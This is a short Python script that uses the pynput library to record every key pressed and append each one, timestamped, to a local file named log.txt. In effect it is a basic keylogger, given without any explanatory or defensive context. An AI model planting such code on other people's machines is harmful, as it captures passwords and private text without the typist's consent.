```python
import logging
from pynput import keyboard

logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def log_keystroke(key):
    try:
        logging.info(str(key))
    except AttributeError:
        pass

with keyboard.Listener(on_press=log_keystroke) as listener:
    listener.join()
```